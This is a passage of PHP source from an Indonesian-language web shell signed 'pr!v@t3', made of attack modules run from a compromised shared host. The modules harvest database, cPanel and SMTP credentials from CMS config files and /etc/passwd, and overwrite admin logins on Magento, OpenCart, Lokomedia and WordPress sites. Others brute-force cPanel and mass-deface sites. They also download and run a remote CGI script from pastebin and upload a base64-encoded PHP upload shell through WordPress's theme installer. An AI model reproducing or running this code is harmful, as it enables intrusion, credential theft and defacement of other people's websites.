                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
                    $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
                    $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
                    $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"'DB_DATABASE', '","'");
                    $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
                    $prefix = $dbprefix."user";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $target = ambilkata($config,"HTTP_SERVER', '","'");
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => OpenCart<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
                    $dbhost = ambilkata($config,'server = "','"');
                    $dbuser = ambilkata($config,'username = "','"');
                    $dbpass = ambilkata($config,'password = "','"');
                    $dbname = ambilkata($config,'database = "','"');
                    $prefix = "users";
                    $option = "identitas";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysql_fetch_array($q);
                    $target = $result[alamat_website];
                    if($target == '') {
                        $target2 = $result[url];
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        if($target2 == '') {
                            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Lokomedia<br>";
                    if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit User Config</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='pr!v@t3' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='pr!v@t3' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form><br>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
} elseif($_GET['do'] == 'cpanel') {
    if($_POST['crack']) {
        $usercp = explode("\r\n", $_POST['user_cp']);
        $passcp = explode("\r\n", $_POST['pass_cp']);
        $i = 0;
        foreach($usercp as $ucp) {
            foreach($passcp as $pcp) {
                if(@mysql_connect('localhost', $ucp, $pcp)) {
                    if($_SESSION[$ucp] && $_SESSION[$pcp]) {
                    } else {
                        $_SESSION[$ucp] = "1";
                        $_SESSION[$pcp] = "1";
                        if($ucp == '' || $pcp == '') {
                           
                        } else {
                            $i++;
                            if(function_exists('posix_getpwuid')) {
                                $domain_cp = file_get_contents("/etc/named.conf"); 
                                if($domain_cp == '') {
                                    $dom =  "<font color=red>gabisa ambil nama domain nya</font>";
                                } else {
                                    preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
                                    foreach($domains_cp[1] as $dj) {
                                        $user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                        $user_cp_url = $user_cp_url['name'];
                                        if($user_cp_url == $ucp) {
                                            $dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
                                            break;
                                        }
                                    }
                                }
                            } else {
                                $dom = "<font color=red>function is Disable by system</font>";
                            }
                            echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>pr!v@t3.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
        USER: <br>
        <textarea style='width: 450px; height: 150px;' name='user_cp'>";
        $_usercp = fopen("/etc/passwd","r");
        while($getu = fgets($_usercp)) {
            if($getu == '' || !$_usercp) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all("/(.*?):x:/", $getu, $u);
                foreach($u[1] as $user_cp) {
                        if(is_dir("/home/$user_cp/public_html")) {
                            echo "$user_cp\n";
                    }
                }
            }
        }
        echo "</textarea><br>
        PASS: <br>
        <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
        function cp_pass($dir) {
            $pass = "";
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                if(!is_file("$dir/$dirb")) continue;
                $ambil = file_get_contents("$dir/$dirb");
                if(preg_match("/WordPress/", $ambil)) {
                    $pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/JConfig|joomla/", $ambil)) {
                    $pass .= ambilkata($ambil,"password = '","'")."\n";
                } elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
                    $pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
                } elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
                    $pass .= ambilkata($ambil,'password = "','"')."\n";
                } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
                    $pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
                } elseif(preg_match("/^[client]$/", $ambil)) {
                    preg_match("/password=(.*?)/", $ambil, $pass1);
                    if(preg_match('/"/', $pass1[1])) {
                        $pass1[1] = str_replace('"', "", $pass1[1]);
                        $pass .= $pass1[1]."\n";
                    } else {
                        $pass .= $pass1[1]."\n";
                    }
                } elseif(preg_match("/cc_encryption_hash/", $ambil)) {
                    $pass .= ambilkata($ambil,"db_password = '","'")."\n";
                }
            }
            echo $pass;
        }
        $cp_pass = cp_pass($dir);
        echo $cp_pass;
        echo "</textarea><br>
        <input type='submit' name='crack' style='width: 450px;' value='Crack'>
        </form>
        <br><span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    }
} elseif($_GET['do'] == 'smtp') {
    echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
                echo "SMTP port: <font color=lime>$smtp_port</font><br>";
                echo "SMTP user: <font color=lime>$smtp_user</font><br>";
                echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
    if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
            $script = $_POST['edit_content'];
        } else {
            $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
    } else {
        echo "<center>
        <h1>Auto Edit Title+Content WordPress</h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked by pr!v@t3' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
} elseif($_GET['do'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
} elseif($_GET['do'] == 'zoneh') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='pr!v@t3'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
} elseif($_GET['do'] == 'cgi') {
    $cgi_dir = mkdir('ec_cgi', 0755);
    $file_cgi = "ec_cgi/cgi.izo";
    $isi_htcgi = "AddHandler cgi-script .izo";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, $cgi_script);
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
    echo "<iframe src='ec_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
    ob_start();
    $cwd = getcwd();
    $ambil_user = explode("/", $cwd);
    $user = $ambil_user[2];
    if($_POST['reverse']) {
        $site = explode("\r\n", $_POST['url']);
        $file = $_POST['file'];
        foreach($site as $url) {
            $cek = getsource("$url/~$user/$file");
            if(preg_match("/hacked/i", $cek)) {
                echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
        reverse($_SERVER['HTTP_HOST']);
        echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
    }
} elseif($_GET['do'] == 'adminer') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function adminer($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
              curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('adminer.php')) {
        echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
    } else {
        if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
            echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
        } else {
            echo "<center><font color=red>gagal buat file adminer</font></center>";
        }
    }
} elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "pr!v@t3";
        $pass = "pr!v@t3";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {                
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?bom&action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=lime>$user</font><br>";
                        echo "[+] password: <font color=lime>$pass</font><br><br>";    
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface</h1>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked by pr!v@t3' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
} elseif($_GET['do'] == 'auto_dwp2') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        $script = htmlspecialchars($_POST['script']);
        $user = "pr!v@t3";
        $pass = "pr!v@t3";
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            if($target == '') {                
                echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
            } else {
                echo "[+] $target <br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                mysql_close($conn);
            } else {
                $site = "$target/wp-login.php";
                $site2 = "$target/wp-admin/theme-install.php?upload";
                $b1 = anucurl($site2);
                $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                $www = "m.php";
                $fp5 = fopen($www,"w");
                fputs($fp5,$upload3);
                $post2 = array(
                        "_wpnonce" => "$anu2",
                        "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                        "themezip" => "@$www",
                        "install-theme-submit" => "Install Now",
                        );
                $ch = curl_init("$target/wp-admin/update.php?bom&action=upload-theme");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
